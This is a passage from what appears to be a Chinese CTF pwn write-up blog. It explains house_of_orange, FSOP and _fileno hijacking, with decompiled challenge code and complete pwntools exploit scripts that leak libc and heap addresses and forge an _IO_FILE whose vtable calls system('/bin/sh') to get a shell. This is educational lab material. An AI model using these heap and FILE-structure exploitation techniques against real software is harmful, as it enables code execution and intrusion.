class="string">&#x27;d&#x27;</span>*<span class="number">0x450</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(<span class="number">0x0000ddaa00000003</span>)+p64(<span class="number">0</span>)</span><br><span class="line">fake = <span class="string">&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0x61</span>)</span><br><span class="line">fake += p64(<span class="number">0</span>)+p64(IO_list_all-<span class="number">0x10</span>)</span><br><span class="line">fake += p64(<span class="number">0</span>) + p64(<span class="number">1</span>)</span><br><span class="line">fake = fake.ljust(<span class="number">0xc0</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake += p64(<span class="number">0</span>) * <span class="number">3</span></span><br><span class="line">fake += p64(heap_addr+<span class="number">0x558</span>) <span class="comment">#vtable</span></span><br><span class="line">fake += p64(<span class="number">0</span>) * <span class="number">2</span></span><br><span class="line">fake += p64(system)</span><br><span class="line">payload += fake</span><br><span class="line">edit(<span class="built_in">len</span>(payload),payload,<span class="number">2</span>,<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># unlink attack</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;Your choice : &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h4><ul><li><a href="https://www.cnblogs.com/shangye/p/6268981.html">ctf-HITCON-2016-houseoforange学习</a></li><li><a href="https://blog.csdn.net/weixin_44145820/article/details/105270036">houseoforange_hitcon_2016（House of orange， unsorted bin attack，FSOP）</a></li><li><a href="https://www.jianshu.com/p/1e45b785efc1">house_of_orange</a></li></ul><h3 id="2020-纵横杯-wind-farm-panel"><a href="#2020-纵横杯-wind-farm-panel" class="headerlink" title="2020_纵横杯_wind_farm_panel"></a>2020_纵横杯_wind_farm_panel</h3><h4 id="基本情况-3"><a href="#基本情况-3" class="headerlink" title="基本情况"></a>基本情况</h4><p>十分明显的堆溢出：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">edit</span><span class="params">(__int64 a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please modify your personal information.\nWhich turbine: &quot;</span>);</span><br><span class="line">  v3 = read_int(<span class="string">&quot;Please modify your personal information.\nWhich turbine: &quot;</span>, a2);</span><br><span class="line">  <span class="keyword">if</span> ( !*((_QWORD *)&amp;area + v3) || v3 &lt; <span class="number">0</span> || v3 &gt; <span class="number">4</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Unvalidated Input&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please input: &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, *((<span class="keyword">void</span> **)&amp;area + v3), <span class="number">0x1000</span>uLL);   <span class="comment">// 堆溢出</span></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Done&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h4><p>满足 <code>house_of_orange</code> 的条件：堆溢出能修改 topchunk size ；申请 size 限制范围大；没有 free 功能。</p><ol><li>溢出修改 topchunk size ，申请大于 topchunk 的堆，将 topchunk 放入 unsortedbin ，然后泄露 libc 地址</li><li>修复 chunk_size&amp;pre_size ，申请 larginbin 泄露 heap_addr</li><li>FSOP</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># overwrite topchunk size</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x88</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span>+p64(<span class="number">0xf71</span>))</span><br><span class="line"><span class="comment"># frow topchunk into unsortedbin</span></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0xfff</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#leak libc</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x90</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x90</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">88</span>-<span class="number">0x3c4b20</span></span><br><span class="line">log.info(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br></pre></td></tr></table></figure><p>申请 larginbin 之前，需要修复泄露 libc 破坏的 chunk_szie ，以后布置 prev_size ：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># repair chunk_size&amp;prev_size</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span>+p64(<span class="number">0xf71</span>)+p64(libc_base+<span class="number">88</span>+<span class="number">0x3c4b20</span>)*<span class="number">2</span></span><br><span class="line">payload += <span class="string">&#x27;a&#x27;</span>*<span class="number">0xf50</span>+p64(<span class="number">0xf70</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Done&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># larginbin leak heap addr</span></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x450</span>,<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0xa0</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">heap_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x90</span></span><br><span class="line">log.info(<span class="string">&quot;heap_base:&quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br></pre></td></tr></table></figure><h4 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = remote(&quot;182.92.203.154&quot;,28452)</span></span><br><span class="line"><span class="comment"># libc = ELF(&quot;./libc-2.23.so&quot;)</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">command</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params"><span class="built_in">id</span>,size,content</span>):</span></span><br><span class="line">command(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">p.send(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">command(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params"><span class="built_in">id</span>,content</span>):</span></span><br><span class="line">command(<span class="number">3</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="comment"># overwrite topchunk size</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x88</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span>+p64(<span class="number">0xf71</span>))</span><br><span class="line"><span class="comment"># frow topchunk into unsortedbin</span></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0xfff</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#leak libc</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x90</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x90</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">88</span>-<span class="number">0x3c4b20</span></span><br><span class="line">log.info(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line"><span class="comment"># repair chunk_size&amp;prev_size</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span>+p64(<span class="number">0xf71</span>)+p64(libc_base+<span class="number">88</span>+<span class="number">0x3c4b20</span>)*<span class="number">2</span></span><br><span class="line">payload += <span class="string">&#x27;a&#x27;</span>*<span class="number">0xf50</span>+p64(<span class="number">0xf70</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Done&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># larginbin leak heap addr</span></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x450</span>,<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0xa0</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">heap_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x90</span></span><br><span class="line">log.info(<span class="string">&quot;heap_base:&quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span>+p64(<span class="number">0x461</span>))</span><br><span class="line"></span><br><span class="line">IO_list_all=libc_base+libc.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;IO_list_all:&quot;</span>+<span class="built_in">hex</span>(IO_list_all))</span><br><span class="line">system=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># FSOP</span></span><br><span class="line"><span class="comment"># set fake struct</span></span><br><span class="line"><span class="comment">#payload=&#x27;a&#x27;*0x450+p64(0)+p64(0x21)+p64(0x0000ddaa00000003)+p64(0)</span></span><br><span class="line">payload = <span class="string">&#x27;b&#x27;</span>*<span class="number">0x450</span></span><br><span class="line">fake = <span class="string">&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0x61</span>)</span><br><span class="line">fake += p64(<span class="number">0</span>)+p64(IO_list_all-<span class="number">0x10</span>)</span><br><span class="line">fake += p64(<span class="number">0</span>) + p64(<span class="number">1</span>)</span><br><span class="line">fake = fake.ljust(<span class="number">0xc0</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake += p64(<span class="number">0</span>) * <span class="number">3</span></span><br><span class="line">fake += p64(heap_base+<span class="number">0x5c8</span>) <span class="comment"># vtable</span></span><br><span class="line">fake += p64(<span class="number">0</span>) * <span class="number">2</span></span><br><span class="line">fake += p64(system)</span><br><span class="line">payload += fake</span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = &#x27;b&#x27;*0x458+p64(0x60)</span></span><br><span class="line">edit(<span class="number">2</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b *$rebase(0xc2e)&#x27;)</span></span><br><span class="line"></span><br><span class="line">command(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0x80</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="劫持-fileno-控制文件流"><a href="#劫持-fileno-控制文件流" class="headerlink" title="劫持 fileno 控制文件流"></a>劫持 fileno 控制文件流</h2><p>先来了解一下 linux 的 file 文件结构，fileno 等概念。</p><h3 id="IO-FILE-结构-1"><a href="#IO-FILE-结构-1" class="headerlink" title="_IO_FILE 结构"></a>_IO_FILE 结构</h3><p>FILE 在 Linux 系统的标准 IO 库中是用于描述文件的结构，称为文件流。在标准 I/O 库中，每个程序启动时有三个文件流是自动打开的：<strong>stdin、stdout、stderr，分别对应文件描述符：0、1、2</strong>。后续再打开文件对应的文件描述符就从 3 开始，当然可以用 dup2 修改。</p><p><strong>每个文件流都有自己的 FILE 结构体</strong>。结构体内容如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> _flags;       <span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_ptr;   <span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_end;   <span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_base;  <span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_base; <span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_ptr;  <span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_end;  <span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_base;   <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_end;    <span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> _fileno;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">  <span class="keyword">int</span> _blksize;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">  <span class="keyword">int</span> _flags2;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it&#x27;s too small.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> _cur_column;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">char</span> _vtable_offset;</span><br><span class="line">  <span class="keyword">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在 ida 中搜索 <code>_IO_2_1_stdxxx_</code> 或者 <code>stdxx</code> 可以找到默认打开的三个文件描述符 FILE 结构体存储地址：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210126231723.png" alt="image-20201210083553060"></p><p> gdb 调试中查看结构体内容：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210126231706.png" alt="image-20201210083345062"></p><p><strong>_fileno</strong> 是当前文件流的文件描述符，上图是 stderr 对应就是 2 。</p><p>我们知道 stdin 文件描述符是 0 ，如果我们将 stdin 的 fileno 修改为 2 ，那么 stdin 就变成了 stderr 。</p><h3 id="实战练习"><a href="#实战练习" class="headerlink" title="实战练习"></a>实战练习</h3><h4 id="基本情况-4"><a href="#基本情况-4" class="headerlink" title="基本情况"></a>基本情况</h4><p>原题环境是在 ubuntu18.04 旧版本 glibc ，也就是允许 tcache doublefree ，注意检查 glibc 版本。</p><pre><code>Arch:     amd64-64-littleRELRO:    Full RELROStack:    Canary foundNX:       NX enabledPIE:      PIE enabled</code></pre><p>在初始化函数中，打开 flag 的文件流，紧接着用 dup2 将原本文件描述符从 3 修改为 666 。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">init</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">……</span><br><span class="line">  fd = open(<span class="string">&quot;flag&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( fd == <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;no such file :flag&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  dup2(fd, <span class="number">666</span>);                                <span class="comment">// 改变文件描述符</span></span><br><span class="line">  close(fd);</span><br><span class="line">……</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>堆申请有两种大小：0x20、0x30 ，数量没有限制。结构体如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">int</span>&#123;</span></span><br><span class="line">  <span class="keyword">int</span> num;</span><br><span class="line">  <span class="keyword">int</span> num;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">short_int</span>&#123;</span></span><br><span class="line"> <span class="keyword">short</span> num;</span><br><span class="line">  <span class="keyword">short</span> num;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>free 堆后没有将指针指令，造成 UAF 漏洞，还有一点就是 doublefree 需要处理 bool 这个全局变量：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">……</span><br><span class="line">  <span class="keyword">if</span> ( <span class="keyword">bool</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;TYPE:\n1: int\n2: short int\n&gt;&quot;</span>);</span><br><span class="line">    v1 = get_atoi();</span><br><span class="line">    <span class="keyword">if</span> ( v1 == <span class="number">1</span> &amp;&amp; int_pt )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span>(int_pt);</span><br><span class="line">      <span class="keyword">bool</span> = <span class="number">0</span>;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;remove success !&quot;</span>);                 <span class="comment">// UAF</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v1 == <span class="number">2</span> &amp;&amp; short_pt )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span>(short_pt);</span><br><span class="line">      <span class="keyword">bool</span> = <span class="number">0</span>;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;remove success !&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">……</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>show 函数限制使用 3 次，还需要注意输出长度问题，也就是用于泄露地址时并不是完整的地址：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">show</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">……</span><br><span class="line">  <span class="keyword">if</span> ( show_time-- )<span class="comment">//show_time=3</span></span><br><span class="line">……</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>exit 函数有一段输出功能：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __noreturn <span class="title">bye_bye</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  ……</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%99s&quot;</span>, v0);</span><br><span class="line">  ……</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="思路-4"><a href="#思路-4" class="headerlink" title="思路"></a>思路</h4><p>利用 exit 时 scanf 输出函数，就 stdin 的文件描述符修改为 666 ，那么输出就变成输出，将 flag 内容给输出出来。</p><p>double free tcache 泄露堆地址：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># leak heap address</span></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x30</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x20</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x30</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">heap_base = show(<span class="number">2</span>)-<span class="number">0x290</span></span><br><span class="line">log.info(<span class="string">&quot;heap_base:&quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br></pre></td></tr></table></figure><p>修改 chunk0 size ：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># house of spirt</span></span><br><span class="line">add(<span class="number">2</span>, heap_base+<span class="number">0x250</span>)</span><br><span class="line">add(<span class="number">2</span>, heap_base+<span class="number">0x250</span>)</span><br><span class="line"><span class="comment"># overwrite chunk0 size to 0x91</span></span><br><span class="line">add(<span class="number">2</span>, <span 